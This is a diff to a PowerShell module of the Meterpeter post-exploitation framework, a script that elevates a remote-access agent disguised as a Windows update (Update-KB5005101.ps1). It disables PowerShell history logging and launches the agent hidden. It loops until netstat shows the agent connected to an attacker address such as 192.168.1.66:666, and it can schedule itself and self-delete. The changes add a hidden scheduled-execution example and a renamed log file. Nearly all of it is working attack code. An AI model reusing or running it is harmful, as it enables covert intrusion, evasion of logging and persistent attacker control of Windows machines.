@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: netstat
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    Auxiliary module of Meterpeter v2.10.14 that allow users to
@@ -18,7 +18,7 @@
    it with admin privileges by sellecting 'NO' button in UAC prompt
    Warning: Parameter -attacker 'LHOST:LPORT' allows this cmdlet to
    check for agent conection [loop] or abort cmdlet execution if any
-   connection from server <-> client is found active (break loop)
+   connection from server <-> client is found active (breaking loop)
 
 .Parameter Attacker
    Attacker LHOST:LPORT (default: off)
@@ -27,14 +27,14 @@
    Schedule execution to HH:mm (default: off)
 
 .Parameter AgentPath
-   Meterpeter agent full path (default: $Env:TMP)
+   Agent (default: $Env:TMP\Update-KB5005101.ps1)
 
 .Parameter AutoDel
    Switch that auto-deletes this cmdlet in the end
 
 .EXAMPLE
-   PS C:\> .\uaceop.ps1 -agentpath "$pwd"
-   Update-KB5005101.ps1 directory full path
+   PS C:\> .\uaceop.ps1 -agentpath "$pwd\evil.ps1"
+   try to elevate evil.ps1 privileges only once
   
 .EXAMPLE
    PS C:\> .\uaceop.ps1 -attacker '192.168.1.66:666' -autodel
@@ -43,6 +43,10 @@
 .EXAMPLE
    PS C:\> .\uaceop.ps1 -starttime '09:34' -attacker '192.168.1.66:666' -autodel
    Schedule execution to HH:mm + loop agent execution until a connection its found active
+
+.EXAMPLE
+   PS C:\> Start-Process -windowstyle hidden -argumentlist "-file uaceop.ps1 -starttime '09:34' -attacker '192.168.1.66:666' -autodel"
+   Hidden schedule execution of beacon to HH:mm + loop agent execution until a connection its found active + autodelete this cmdlet
 
 .INPUTS
    None. You cannot pipe objects into UacEop.ps1
@@ -60,7 +64,7 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
-   [string]$AgentPath="$Env:TMP",
+   [string]$AgentPath="$Env:TMP\Update-KB5005101.ps1",
    [string]$StartTime="off",
    [string]$Attacker="off",
    [switch]$AutoDel
@@ -71,8 +75,10 @@
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
-## Send Attacker settings to logfile
-echo "$Attacker" >> "$Env:TMP\fddr.log"
+## Send Attacker settings to logfile its a mandatory step
+# because the 2 time, cmdlet exec with default parameters
+echo "Server: $Attacker" >> "$Env:TMP\Programdata.log"
+echo "Client: $AgentPath" >> "$Env:TMP\Programdata.log"
 
 
 If($StartTime -Match '^(\d+\d+:+\d+\d)$')
@@ -102,7 +108,8 @@ If($StartTime -Match '^(\d+\d+:+\d+\d)$')
 }
 
 
-$Attacker = (Get-Content -Path "$Env:TMP\fddr.log"|Select-Object -First 1)
+$Attacker = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Server:"|Select-Object -First 1) -replace '^(Server: )','')
+$AgentPath = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Client:"|Select-Object -First 1) -replace '^(Client: )','')
 If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
    $Namelless = "%R@unA@s%" -replace '(@|%)',''
@@ -121,7 +128,7 @@ If($Attacker -match '^(off)$')
    #>
 
    write-host "[*] Executing meterpeter client [Admin:Once]"
-   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\Update-KB5005101.ps1"   
+   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"   
 }
 Else
 {
@@ -139,7 +146,7 @@ Else
    For(;;)
    {
       write-host "[*] Executing meterpeter client [Admin:Comfirm]"
-      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\Update-KB5005101.ps1"
+      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"
       Start-Sleep -Seconds 10 ## Give extra time for agent to beacon home
 
       $CheckAgentConnection = (netstat -ano|findstr /C:"ESTABLISHED"|findstr /C:"$Attacker")
@@ -163,5 +170,5 @@ If($AutoDel.IsPresent)
 }
 
 Start-Sleep -Seconds 2
-Remove-Item -Path "$Env:TMP\fddr.log" -Force
+Remove-Item -Path "$Env:TMP\Programdata.log" -Force
 exit
